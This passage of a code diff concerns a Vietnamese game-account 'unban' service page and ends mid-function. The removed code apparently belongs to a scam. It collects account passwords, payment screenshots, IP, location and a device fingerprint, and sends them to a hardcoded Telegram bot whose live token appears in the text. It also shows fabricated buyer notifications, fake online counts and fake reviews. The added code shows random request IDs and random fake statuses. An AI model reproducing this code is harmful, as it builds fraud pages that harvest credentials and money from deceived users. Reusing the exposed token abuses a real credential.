+                            <input type="file" id="idFileInput" accept=".jpg,.png,.pdf">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="agreeUnbanTerms" required>
+                            <label for="agreeUnbanTerms" style="margin-bottom: 0;">
+                                Tôi cam kết tuân thủ điều khoản và không tái phạm
+                            </label>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn">🔄 Gửi Yêu Cầu Mở Khóa</button>
+                </form>
+                <div id="unbanMessage" class="success-message"></div>
             </div>
-          </div>
+
+            <!-- Tab Kiểm Tra Trạng Thái -->
+            <div id="status" class="tab-pane">
+                <div class="info-box">
+                    <h3>🔍 Kiểm tra trạng thái yêu cầu:</h3>
+                    <p>Nhập mã yêu cầu để kiểm tra tiến độ xử lý</p>
+                </div>
+
+                <form id="statusForm" onsubmit="checkStatus(event)">
+                    <div class="form-group">
+                        <label>🎫 Mã yêu cầu:</label>
+                        <input type="text" placeholder="Nhập mã yêu cầu (VD: REQ-2024-XXXX)" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>📧 Email đã đăng ký:</label>
+                        <input type="email" placeholder="Nhập email đã sử dụng khi gửi yêu cầu" required>
+                    </div>
+
+                    <button type="submit" class="btn">🔍 Kiểm Tra Trạng Thái</button>
+                </form>
+
+                <div id="statusResult" style="margin-top: 20px; display: none;">
+                    <h3 style="margin-bottom: 15px;">📊 Kết Quả:</h3>
+                    <div style="background: #f8f9fa; padding: 20px; border-radius: 10px;">
+                        <div class="form-group">
+                            <strong>Mã yêu cầu:</strong> <span id="requestId">-</span>
+                        </div>
+                        <div class="form-group">
+                            <strong>Trạng thái:</strong> 
+                            <span id="requestStatus" class="status-badge">-</span>
+                        </div>
+                        <div class="form-group">
+                            <strong>Ngày gửi:</strong> <span id="requestDate">-</span>
+                        </div>
+                        <div class="form-group">
+                            <strong>Dự kiến xử lý:</strong> <span id="estimatedTime">-</span>
+                        </div>
+                    </div>
+                </div>
+                <div id="statusMessage" class="error-message"></div>
+            </div>
         </div>
-
-        <div style="margin-top:16px;">
-          <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🤖 <span id="captchaQuestion"></span> = ?</label>
-          <input type="number" class="input-field" id="captchaAnswer" placeholder="Kết quả">
-        </div>
-
-        <button class="btn-submit" id="submitRequestBtn">
-          <i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND
-        </button>
-      </div>
-
-      <!-- Result Box -->
-      <div id="resultBox" class="hidden" style="margin-top:20px; padding:18px; border-radius:20px; background:#0b1322; font-weight:bold; border:1px solid #3f5580;"></div>
-      
-      <!-- Timer -->
-      <div id="timerDisplay" class="hidden" style="font-size:2rem; font-weight:bold; color:#ffd966; text-align:center; margin:15px 0;"></div>
-
-      <!-- Reviews -->
-      <div class="section-title mt-20"><i class="fas fa-comments"></i> Đánh Giá</div>
-      <div id="reviewsContainer">
-        <div class="review-card">
-          <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">
-            <div style="width:35px;height:35px;border-radius:50%;background:#e74c3c;display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;">NH</div>
-            <div><strong>Nguyễn Hùng</strong><span style="font-size:0.8rem;color:#9aa9c1;margin-left:5px;">• Hà Nội</span><div>⭐⭐⭐⭐⭐</div></div>
-          </div>
-          <p style="color:#bdd3ff;margin:8px 0;">Tool chạy nhanh, 15 phút là xong!</p>
-          <small style="color:#9aa9c1;">• Vừa xong</small>
-        </div>
-      </div>
     </div>
-  </div>
 
-  <script>
-    // ============================================
-    // CONFIGURATION - TELEGRAM
-    // ============================================
-    const TELEGRAM_BOT_TOKEN = '8980322724:AAEbExHdPUgFMKjnSryNhcH4jvE5gMYCGHo';
-    const TELEGRAM_CHAT_ID = '8742603540';
-    const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-
-    // ============================================
-    // GLOBAL STATE
-    // ============================================
-    let userIP = '';
-    let userLocation = null;
-    let deviceFingerprint = '';
-    let uploadedImageFile = null;
-    let uploadedImageData = null;
-    let isBanned = false;
-    let pollingInterval = null;
-    let lastUpdateId = 0;
-    let bannedIPs = JSON.parse(localStorage.getItem('tool_banned_ips') || '[]');
-    let orderStatus = 'idle'; // idle, waiting, approved, rejected, banned
-
-    const state = {
-      serviceType: 'unban_account',
-      game: 'freefire',
-      server: 'vietnam',
-      platform: 'facebook',
-      paymentMethod: 'bank',
-      plan: { name: 'basic', price: 150000, time: '30-45' },
-      currentOrderId: null,
-      captchaResult: 0,
-      countdownInterval: null,
-      approvedMessageId: null
-    };
-
-    // ============================================
-    // TELEGRAM API FUNCTIONS
-    // ============================================
-    async function sendToTelegram(text) {
-      try {
-        const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' })
-        });
-        return await res.json();
-      } catch(e) { console.error('Telegram error:', e); return null; }
-    }
-
-    async function sendPhotoToTelegram(blob, caption) {
-      try {
-        const fd = new FormData();
-        fd.append('chat_id', TELEGRAM_CHAT_ID);
-        fd.append('photo', blob, 'payment.jpg');
-        if (caption) fd.append('caption', caption);
-        const res = await fetch(`${TELEGRAM_API}/sendPhoto`, { method: 'POST', body: fd });
-        return await res.json();
-      } catch(e) { console.error('Photo error:', e); return null; }
-    }
-
-    async function sendMessageWithButtons(text, buttons) {
-      try {
-        const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text,
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: buttons }
-          })
-        });
-        return await res.json();
-      } catch(e) { console.error('Buttons error:', e); return null; }
-    }
-
-    async function answerCallback(callbackQueryId, text) {
-      try {
-        await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
-        });
-      } catch(e) {}
-    }
-
-    async function editMessageText(messageId, text) {
-      try {
-        const res = await fetch(`${TELEGRAM_API}/editMessageText`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            message_id: messageId,
-            text: text,
-            parse_mode: 'HTML'
-          })
-        });
-        return await res.json();
-      } catch(e) { console.error('Edit message error:', e); return null; }
-    }
-
-    // ============================================
-    // TELEGRAM COMMAND HANDLER
-    // ============================================
-    async function handleTelegramCommand(text, messageId) {
-      const cmd = text.trim().toLowerCase();
-      console.log(`[CMD] Nhận lệnh: ${cmd}`);
-      
-      // /help
-      if (cmd === '/help' || cmd === '/start') {
-        const helpText = `
-🤖 <b>HƯỚNG DẪN LỆNH TELEGRAM</b>
-━━━━━━━━━━━━━━━━━━
-
-📌 <b>Lệnh quản lý IP:</b>
-
-<code>/banip &lt;IP&gt;</code>
-  → Chặn IP (cấm truy cập)
-
-<code>/unbanip &lt;IP&gt;</code>
-  → Mở chặn IP (cho phép truy cập)
-
-<code>/listban</code>
-  → Xem danh sách IP bị chặn
-
-━━━━━━━━━━━━━━━━━━
-💡 <i>Ví dụ:</i>
-<code>/banip 192.168.1.100</code>
-<code>/unbanip 192.168.1.100</code>
-
-📊 <b>Trạng thái:</b>
-${bannedIPs.length} IP đang bị chặn
-        `;
-        await sendToTelegram(helpText);
-        return true;
-      }
-      
-      // /banip <IP>
-      if (cmd.startsWith('/banip ')) {
-        const ip = cmd.substring(7).trim();
-        if (!ip || !validateIP(ip)) {
-          await sendToTelegram(`❌ <b>IP không hợp lệ!</b>\nVui lòng nhập đúng định dạng IP.\nVD: /banip 192.168.1.100`);
-          return true;
-        }
-        
-        if (bannedIPs.includes(ip)) {
-          await sendToTelegram(`⚠️ <b>IP ${ip} đã bị chặn từ trước!</b>`);
-          return true;
-        }
-        
-        bannedIPs.push(ip);
-        localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
-        
-        await sendToTelegram(`✅ <b>ĐÃ CHẶN IP: ${ip}</b>\n━━━━━━━━━━━━━━━━━━\nIP ${ip} đã bị chặn thành công!\n📊 Tổng: ${bannedIPs.length} IP bị chặn`);
-        
-        // Kiểm tra nếu IP bị chặn là user hiện tại
-        if (ip === userIP) {
-          showBannedScreen(ip);
-        }
-        return true;
-      }
-      
-      // /unbanip <IP>
-      if (cmd.startsWith('/unbanip ')) {
-        const ip = cmd.substring(9).trim();
-        if (!ip || !validateIP(ip)) {
-          await sendToTelegram(`❌ <b>IP không hợp lệ!</b>\nVui lòng nhập đúng định dạng IP.\nVD: /unbanip 192.168.1.100`);
-          return true;
-        }
-        
-        const index = bannedIPs.indexOf(ip);
-        if (index === -1) {
-          await sendToTelegram(`⚠️ <b>IP ${ip} không có trong danh sách chặn!</b>`);
-          return true;
-        }
-        
-        bannedIPs.splice(index, 1);
-        localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
-        
-        await sendToTelegram(`✅ <b>ĐÃ MỞ CHẶN IP: ${ip}</b>\n━━━━━━━━━━━━━━━━━━\nIP ${ip} đã được mở chặn!\n📊 Còn ${bannedIPs.length} IP đang bị chặn`);
-        
-        // Nếu là IP hiện tại, reload trang
-        if (ip === userIP) {
-          setTimeout(() => {
-            Swal.fire({
-              icon: 'success',
-              title: '✅ IP đã được mở chặn!',
-              text: 'Trang sẽ tải lại...',
-              timer: 2000
-            }).then(() => location.reload());
-          }, 500);
-        }
-        return true;
-      }
-      
-      // /listban
-      if (cmd === '/listban') {
-        if (bannedIPs.length === 0) {
-          await sendToTelegram(`📋 <b>DANH SÁCH IP BỊ CHẶN</b>\n━━━━━━━━━━━━━━━━━━\n📭 Hiện tại chưa có IP nào bị chặn.`);
-        } else {
-          let listText = `📋 <b>DANH SÁCH IP BỊ CHẶN</b>\n━━━━━━━━━━━━━━━━━━\n`;
-          bannedIPs.forEach((ip, index) => {
-            listText += `${index + 1}. <code>${ip}</code>\n`;
-          });
-          listText += `━━━━━━━━━━━━━━━━━━\n📊 Tổng: ${bannedIPs.length} IP`;
-          await sendToTelegram(listText);
-        }
-        return true;
-      }
-      
-      return false;
-    }
-
-    function validateIP(ip) {
-      const pattern = /^(\d{1,3}\.){3}\d{1,3}$/;
-      if (!pattern.test(ip)) return false;
-      const parts = ip.split('.');
-      return parts.every(p => parseInt(p) >= 0 && parseInt(p) <= 255);
-    }
-
-    // ============================================
-    // POLLING - NHẬN LỆNH & CALLBACK TỪ TELEGRAM
-    // ============================================
-    async function startPolling() {
-      if (pollingInterval) clearInterval(pollingInterval);
-      
-      console.log('[Polling] Bắt đầu lắng nghe Telegram...');
-      
-      pollingInterval = setInterval(async () => {
-        try {
-          const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
-          const data = await res.json();
-          
-          if (!data.ok || !data.result.length) return;
-          
-          for (const update of data.result) {
-            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+    <script>
+        // Chuyển đổi tab
+        function switchTab(tabName) {
+            // Ẩn tất cả các tab pane
+            document.querySelectorAll('.tab-pane').forEach(pane => {
+                pane.classList.remove('active');
+            });
             
-            // Xử lý tin nhắn text (lệnh)
-            if (update.message && update.message.text) {
-              const msgText = update.message.text;
-              const handled = await handleTelegramCommand(msgText, update.message.message_id);
-              if (handled) continue;
+            // Bỏ active tất cả các tab
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Hiện tab được chọn
+            document.getElementById(tabName).classList.add('active');
+            
+            // Active tab button tương ứng
+            event.target.classList.add('active');
+            
+            // Ẩn các thông báo
+            document.querySelectorAll('.success-message, .error-message').forEach(el => {
+                el.style.display = 'none';
+            });
+            
+            // Reset form status
+            document.getElementById('statusResult').style.display = 'none';
+        }
+
+        // Xử lý form khôi phục
+        function handleRecovery(event) {
+            event.preventDefault();
+            
+            const messageDiv = document.getElementById('recoveryMessage');
+            const requestId = 'REQ-' + new Date().getFullYear() + '-' + 
+                            Math.random().toString(36).substr(2, 8).toUpperCase();
+            
+            messageDiv.innerHTML = `
+                ✅ Yêu cầu khôi phục đã được gửi thành công!<br>
+                Mã yêu cầu của bạn: <strong>${requestId}</strong><br>
+                Vui lòng kiểm tra email để xác nhận. Thời gian xử lý dự kiến: 24-48 giờ.
+            `;
+            messageDiv.style.display = 'block';
+            
+            // Reset form
+            event.target.reset();
+            
+            // Scroll to message
+            messageDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Xử lý form mở band
+        function handleUnban(event) {
+            event.preventDefault();
+            
+            const messageDiv = document.getElementById('unbanMessage');
+            const requestId = 'UNBAN-' + new Date().getFullYear() + '-' + 
+                            Math.random().toString(36).substr(2, 8).toUpperCase();
+            
+            messageDiv.innerHTML = `
+                ✅ Yêu cầu mở khóa Band ID đã được gửi thành công!<br>
+                Mã yêu cầu của bạn: <strong>${requestId}</strong><br>
+                Đội ngũ hỗ trợ sẽ xem xét yêu cầu của bạn trong vòng 48-72 giờ.
+            `;
+            messageDiv.style.display = 'block';
+            
+            // Reset form
+            event.target.reset();
+            
+            // Scroll to message
+            messageDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Kiểm tra trạng thái
+        function checkStatus(event) {
+            event.preventDefault();
+            
+            const statusResult = document.getElementById('statusResult');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            // Giả lập kiểm tra trạng thái
+            const statuses = ['Đang xử lý', 'Đã duyệt', 'Từ chối', 'Cần bổ sung thông tin'];
+            const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
+            
+            document.getElementById('requestId').textContent = event.target.querySelector('input').value;
+            document.getElementById('requestStatus').textContent = randomStatus;
+            document.getElementById('requestDate').textContent = new Date().toLocaleDateString('vi-VN');
+            document.getElementById('estimatedTime').textContent = '24-48 giờ';
+            
+            // Cập nhật class cho status badge
+            const statusBadge = document.getElementById('requestStatus');
+            statusBadge.className = 'status-badge';
+            switch(randomStatus) {
+                case 'Đã duyệt':
+                    statusBadge.classList.add('status-active');
+                    break;
+                case 'Từ chối':
+                    statusBadge.classList.add('status-banned');
+                    break;
+                default:
+                    statusBadge.classList.add('status-pending');
             }
             
-            // Xử lý callback query (nút bấm từ đơn hàng)
-            if (update.callback_query) {
-              const cb = update.callback_query;
-              const msgId = cb.message?.message_id;
-              const dataParts = cb.data.split('_');
-              const action = dataParts[0];
-              const oid = dataParts[1];
-              
-              console.log(`[Callback] Action: ${action}, Order: ${oid}`);
-              
-              // Kiểm tra đơn hàng
-              if (oid !== state.currentOrderId) {
-                await answerCallback(cb.id, '⚠️ Đơn hàng không hợp lệ!');
-                continue;
-              }
-              
-              if (action === 'approve') {
-                clearInterval(pollingInterval);
-                await answerCallback(cb.id, '✅ Đã duyệt! Tool đang chạy...');
+            statusResult.style.display = 'block';
+            statusMessage.style.display = 'none';
+        }
+
+        // Xử lý file upload
+        document.querySelectorAll('.file-upload').forEach(upload => {
+            upload.addEventListener('dragover', (e) => {
+                e.preventDefault();
+                upload.style.borderColor = '#667eea';
+                upload.style.background = '#f8f9fa';
+            });
+
+            upload.addEventListener('dragleave', () => {
+                upload.style.borderColor = '#e0e0e0';
+                upload.style.background = 'transparent';
+            });
+
+            upload.addEventListener('drop', (e) => {
+                e.preventDefault();
+                upload.style.borderColor = '#e0e0e0';
+                upload.style.background = 'transparent';
                 
-                // Cập nhật message trên Telegram
-                await editMessageText(msgId, 
-                  `✅ <b>ĐÃ DUYỆT</b> #${oid}\n━━━━━━━━━━━━━━━━━━\nYêu cầu đã được admin duyệt!\nTool đang tự động xử lý...`
-                );
-                
-                await sendToTelegram(`✅ <b>ĐÃ DUYỆT</b> #${oid}\nTool đang tự động xử lý yêu cầu của bạn...`);
-                updateOrderStatus('approved');
-                
-              } else if (action === 'reject') {
-                clearInterval(pollingInterval);
-                const reason = dataParts[2] ? decodeURIComponent(dataParts[2]) : 'Không có lý do';
-                await answerCallback(cb.id, '❌ Đã từ chối!');
-                
-                await editMessageText(msgId,
-                  `❌ <b>ĐÃ TỪ CHỐI</b> #${oid}\n━━━━━━━━━━━━━━━━━━\nLý do: ${reason}\n\nVui lòng gửi lại yêu cầu mới!`
-                );
-                
-                await sendToTelegram(`❌ <b>ĐÃ TỪ CHỐI</b> #${oid}\nLý do: ${reason}`);
-                updateOrderStatus('rejected', reason);
-                
-              } else if (action === 'ban') {
-                clearInterval(pollingInterval);
-                const ip = dataParts[2] ? decodeURIComponent(dataParts[2]) : userIP;
-                await answerCallback(cb.id, '🚫 Đã cấm IP!');
-                
-                // Thêm IP vào danh sách chặn
-                if (!bannedIPs.includes(ip)) {
-                  bannedIPs.push(ip);
-                  localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
+                const files = e.dataTransfer.files;
+                if (files.length > 0) {
+                    upload.querySelector('p').textContent = `✅ Đã chọn: ${files[0].name}`;
                 }
-                
-                await editMessageText(msgId,
-                  `🚫 <b>ĐÃ CHẶN IP</b> #${oid}\n━━━━━━━━━━━━━━━━━━\nIP: <code>${ip}</code>\nĐã thêm vào danh sách chặn!`
-                );
-                
-                await sendToTelegram(`🚫 <b>ĐÃ CHẶN IP</b>: ${ip}\nĐơn #${oid}\n📊 Tổng: ${bannedIPs.length} IP bị chặn`);
-                updateOrderStatus('banned', `IP ${ip} đã bị cấm`);
-                setTimeout(() => showBannedScreen(ip), 1000);
-              }
-              
-              // Bắt đầu polling lại
-              startPolling();
-            }
-          }
-        } catch(e) { console.error('Polling error:', e); }
-      }, 3000);
-    }
+            });
+        });
 
-    // ============================================
-    // IP & LOCATION
-    // ============================================
-    async function fetchIPAndLocation() {
-      try {
-        const apis = [
-          'https://api.ipify.org?format=json',
-          'https://api64.ipify.org?format=json',
-          'https://api.ip.sb/jsonip'
-        ];
-        
-        for (const api of apis) {
-          try {
-            const res = await fetch(api, { headers: { 'Accept': 'application/json' } });
-            if (res.ok) {
-              const data = await res.json();
-              userIP = data.ip || data.ip_address;
-              if (userIP) break;
-            }
-          } catch(e) { continue; }
+        // Cập nhật tên file khi chọn
+        document.querySelectorAll('input[type="file"]').forEach(input => {
+            input.addEventListener('change', (e) => {
+                const upload = e.target.closest('.file-upload');
+                if (e.target.files.length > 0) {
+                    upload.querySelector('p').textContent = `✅ Đã chọn: ${e.target.files[0].name}`;
+                }
+            });
+        });
+
+        // Tự động ẩn thông báo sau 10 giây
+        function autoHideMessage(elementId) {
+            setTimeout(() => {
+                const element = document.getElementById(elementId);
+                if (element) {
+                    element.style.display = 'none';
+                }
+            }, 10000);
         }
-        
-        if (!userIP) userIP = 'unknown';
-
-        try {
-          const res = await fetch(`https://ipinfo.io/${userIP}/json`);
-          if (res.ok) {
-            const data = await res.json();
-            userLocation = {
-              ip: userIP,
-              city: data.city || 'Unknown',
-              region: data.region || 'Unknown',
-              country: data.country || 'Unknown',
-              isp: data.org || 'Unknown'
-            };
-          }
-        } catch(e) {}
-        
-        if (!userLocation) {
-          userLocation = { ip: userIP, city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
-        }
-      } catch(e) {
-        userIP = 'error';
-        userLocation = { ip: 'error', city: 'Error', country: 'Error', isp: 'Error' };
-      }
-    }
-
-    async function generateFingerprint() {
-      try {
-        const comp = {
-          screen: `${screen.width}x${screen.height}`,
-          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          lang: navigator.language,
-          plat: navigator.platform,
-          ua: navigator.userAgent.substring(0, 50)
-        };
-        const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(JSON.stringify(comp)));
-        return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('').substr(0, 16);
-      } catch(e) { return 'fp_' + Date.now().toString(36); }
-    }
-
-    // ============================================
-    // BAN CHECK
-    // ============================================
-    async function checkBanned() {
-      try {
-        bannedIPs = JSON.parse(localStorage.getItem('tool_banned_ips') || '[]');
-        if (bannedIPs.includes(userIP)) {
-          showBannedScreen(userIP);
-          return true;
-        }
-        return false;
-      } catch(e) { return false; }
-    }
-
-    function showBannedScreen(ip) {
-      isBanned = true;
-      document.getElementById('bannedIpDisplay').textContent = ip || userIP;
-      document.getElementById('bannedOverlay').classList.add('show');
-      document.getElementById('mainContent').style.display = 'none';
-    }
-
-    // ============================================
-    // UI FUNCTIONS
-    // ============================================
-    function createParticles() {
-      const c = document.getElementById('particlesContainer');
-      const e = ['✨','⭐','💫','🌟','💰','💎'];
-      for(let i=0;i<20;i++) {
-        const p = document.createElement('div');
-        p.className='particle'; p.textContent=e[Math.floor(Math.random()*e.length)];
-        p.style.left=Math.random()*100+'%'; p.style.animationDuration=(Math.random()*5+5)+'s';
-        p.style.animationDelay=Math.random()*5+'s'; c.appendChild(p);
-      }
-    }
-
-    function startSocialProof() {
-      const names = ['Nguyễn Hùng','Trần Mai','Lê Nam','Phạm Tuấn','Hoàng Lan'];
-      const plans = ['gói Cơ Bản','gói VIP','gói Ultimate'];
-      const games = ['Free Fire','PUBG','Liên Quân','Mobile Legends'];
-      const cities = ['Hà Nội','TP.HCM','Đà Nẵng','Hải Phòng'];
-      
-      setInterval(() => {
-        if(isBanned) return;
-        const toast = document.createElement('div');
-        toast.className='toast-notification';
-        toast.innerHTML = `<div style="flex:1;"><strong>${names[Math.floor(Math.random()*names.length)]}</strong><br><span style="font-size:0.85rem;">ở <strong>${cities[Math.floor(Math.random()*cities.length)]}</strong> mua ${plans[Math.floor(Math.random()*plans.length)]} cho ${games[Math.floor(Math.random()*games.length)]}</span></div>`;
-        document.getElementById('toastContainer').appendChild(toast);
-        setTimeout(()=>{if(toast.parentNode){toast.style.animation='fadeOut 0.5s ease forwards';setTimeout(()=>toast.remove(),500);}},5000);
-      }, 10000);
-    }
-
-    function updateOnlineCount() {
-      const h = new Date().getHours();
-      let b = h>=20?200:h>=0&&h<=5?30:80;
-      b+=Math.floor(Math.random()*50);
-      document.getElementById('onlineCount').textContent=b;
-      setInterval(()=>{if(!isBanned)document.getElementById('onlineCount').textContent=Math.max(10,parseInt(document.getElementById('onlineCount').textContent)+Math.floor(Math.random()*6)-3);},30000);
-    }
-
-    // ============================================
-    // SERVICE TYPE TOGGLE
-    // ============================================
-    function toggleServiceType(type) {
-      state.serviceType = type;
-      
-      const title = document.getElementById('serviceTypeTitle');
-      const ipGroup = document.getElementById('ipInputGroup');
-      const accountGroup = document.getElementById('accountInputGroup');
-      const platformSelector = document.getElementById('platformSelector');
-      
-      if (type === 'unban_ip') {
-        title.textContent = 'Thông Tin IP Cần Mở Band';
-        ipGroup.classList.remove('hidden');
-        accountGroup.classList.add('hidden');
-        platformSelector.classList.add('hidden');
-      } else {
-        title.textContent = 'Thông Tin Tài Khoản';
-        ipGroup.classList.add('hidden');
-        accountGroup.classList.remove('hidden');
-        platformSelector.classList.remove('hidden');
-      }
-    }
-
-    // ============================================
-    // PRICE & FORM
-    // ============================================
-    const serverPrices = {
-      freefire:{vietnam:1,indonesia:1.3,thailand:1.2,brazil:1.5},
-      pubg:{vietnam:1.2,indonesia:1.4,thailand:1.3,brazil:1.6},
-      mobilelegends:{vietnam:1.1,indonesia:1.2,thailand:1.1,brazil:1.4},
-      lienquan:{vietnam:1,indonesia:1.3,thailand:1.2,brazil:1.5}
-    };
-
-    function updatePrices() {
-      const m = serverPrices[state.game]?.[state.server]||1;
-      const p = Math.round(state.plan.price*m);
-      document.getElementById('bankAmount').textContent=p.toLocaleString();
-      document.getElementById('cardAmount').textContent=p.toLocaleString();
-      document.getElementById('transferContent').textContent='MOBAND'+state.game.toUpperCase().substring(0,4);
-    }
-
-    function getFinalPrice() {
-      return Math.round(state.plan.price*(serverPrices[state.game]?.[state.server]||1));
-    }
-
-    function generateCaptcha() {
-      const a=Math.floor(Math.random()*10)+1,b=Math.floor(Math.random()*10)+1;
-      state.captchaResult=a+b;
-      document.getElementById('captchaQuestion').textContent=`${a} + ${b}`;
-    }
-
-    function copyToClipboard(text) {
-      if(navigator.clipboard){navigator.clipboard.writeText(text).then(()=>Swal.fire({icon:'success',title:'✅ Đã sao chép!',timer:1500,showConfirmButton:false}));}
-      else{const ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);Swal.fire({icon:'success',title:'✅ Đã sao chép!',timer:1500,showConfirmButton:false});}
-    }
-
-    function togglePasswordVisibility() {
-      const i=document.getElementById('passwordInput'),ic=document.getElementById('togglePassword');
-      if(i.type==='password'){i.type='text';ic.classList.replace('fa-eye','fa-eye-slash');}
-      else{i.type='password';ic.classList.replace('fa-eye-slash','fa-eye');}
-    }
-
-    function setupImageUpload() {
-      const dz=document.getElementById('fileUploadArea'),fi=document.getElementById('paymentImage');
-      dz.addEventListener('click',(e)=>{if(e.target.closest('#imagePreviewContainer')||e.target.closest('button'))return;fi.click();});
-      fi.addEventListener('change',(e)=>{if(e.target.files[0])handleImageFile(e.target.files[0]);});
-      dz.addEventListener('dragover',(e)=>{e.preventDefault();dz.classList.add('drag-over');});
-      dz.addEventListener('dragleave',()=>dz.classList.remove('drag-over'));
-      dz.addEventListener('drop',(e)=>{e.preventDefault();dz.classList.remove('drag-over');const f=e.dataTransfer.files[0];if(f&&f.type.startsWith('image/'))handleImageFile(f);});
-    }
-
-    function handleImageFile(file) {
-      if(!['image/jpeg','image/png','image/gif','image/webp'].includes(file.type)){Swal.fire('❌','Định dạng không hỗ trợ!','error');return;}
-      if(file.size>10*1024*1024){Swal.fire('❌','File quá lớn!','error');return;}
-      uploadedImageFile=file;
-      const r=new FileReader();
-      r.onload=(e)=>{uploadedImageData=e.target.result;document.getElementById('imagePreview').src=e.target.result;document.getElementById('uploadPlaceholder').style.display='none';document.getElementById('imagePreviewContainer').style.display='block';document.getElementById('fileUploadArea').style.borderStyle='solid';document.getElementById('fileUploadArea').style.borderColor='#2ecc71';};
-      r.readAsDataURL(file);
-    }
-
-    function removeImage() {
-      uploadedImageFile=null;uploadedImageData=null;
-      document.getElementById('paymentImage').value='';document.getElementById('imagePreview').src='';
-      document.getElementById('uploadPlaceholder').style.display='block';document.getElementById('imagePreviewContainer').style.display='none';
-      document.getElementById('fileUploadArea').style.borderStyle='dashed';document.getElementById('fileUploadArea').style.borderColor='#3f5580';
-    }
-
-    // ============================================
-    // UPDATE STATUS BADGE
-    // ============================================
-    function updateStatusBadge(status, detail = '') {
-      const badge = document.getElementById('statusBadge');
-      badge.className = 'status-badge';
-      
-      switch(status) {
-        case 'idle':
-          badge.textContent = '🟢 Sẵn sàng';
-          badge.classList.add('waiting');
-          break;
-        case 'waiting':
-          badge.textContent = '⏳ Chờ duyệt';
-          badge.classList.add('waiting');
-          break;
-        case 'approved':
-          badge.textContent = '✅ Đã duyệt';
-          badge.classList.add('approved');
-          break;
-        case 'rejected':
-          badge.textContent = `❌ Từ chối${detail ? ': ' + detail : ''}`;
-          badge.classList.add('rejected');
-          break;
-        case 'banned':
-          badge.textContent = '🚫 Đã cấm IP';
-          badge.classList.add('banned');
-          break;
-        default:
-          badge.textContent = '🟢 Sẵn sàng';
-          badge.classList.add('waiting');
-      }
-    }
-
-    // ============================================
-    // ORDER STATUS
-    // ============================================
-    function updateOrderStatus(status, reason = '') {
-      orderStatus = status;
-      const box = document.getElementById('resultBox');
-      box.classList.remove('hidden');
-      updateStatusBadge(status, reason);
-      
-      if (status === 'approved') {
-        box.innerHTML = `<div style="color:#2ecc71;text-align:center;"><h3>✅ ĐÃ DUYỆT!</h3><p>Tool đang xử lý...</p></div>`;
-        simulateProcessing(state.currentOrderId);
-      } else if (status === 'rejected') {
-        box.innerHTML = `<div style="color:#ff6b6b;text-align:center;"><h3>❌ TỪ CHỐI</h3><p>Lý do: ${reason}</p><button class="btn-sm mt-10" onclick="resetForm()">🔄 Gửi lại</button></div>`;
-        document.getElementById('progressBar').classList.add('hidden');
-        document.getElementById('submitRequestBtn').disabled = false;
-        document.getElementById('submitRequestBtn').innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
-        state.currentOrderId = null;
-      } else if (status === 'banned') {
-        box.innerHTML = `<div style="color:#ff6b6b;text-align:center;"><h3>🚫 ĐÃ CẤM IP</h3><p>${reason}</p></div>`;
-        document.getElementById('progressBar').classList.add('hidden');
-      }
-    }
-
-    function resetForm() {
-      orderStatus = 'idle';
-      state.currentOrderId = null;
-      document.getElementById('resultBox').classList.add('hidden');
-      document.getElementById('submitRequestBtn').disabled = false;
-      document.getElementById('submitRequestBtn').innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
-      updateStatusBadge('idle');
-      generateCaptcha();
-      document.getElementById('captchaAnswer').value = '';
-    }
-
-    function simulateProcessing(orderId) {
-      const bar = document.getElementById('progressBar');
-      bar.classList.remove('hidden');
-      
-      ['progressDuyet','progressXuLy','progressDone'].forEach(id=>{
-        const el=document.getElementById(id);
-        if(el){el.classList.remove('active','completed');
-        if(id==='progressDuyet')el.textContent='⏳ Chờ duyệt';
-        if(id==='progressXuLy')el.textContent='🔧 Xử lý';
-        if(id==='progressDone')el.textContent='✅ Xong';}
-      });
-      
-      const d = document.getElementById('progressDuyet');
-      d.classList.add('completed');d.textContent='✅ Duyệt';
-      
-      const x = document.getElementById('progressXuLy');
-      x.classList.add('active');
-      
-      const t = state.plan.name==='ultimate'?5000:state.plan.name==='vip'?12000:25000;
-      
-      setTimeout(()=>{
-        x.classList.remove('active');x.classList.add('completed');x.textContent='✅ Xử lý';
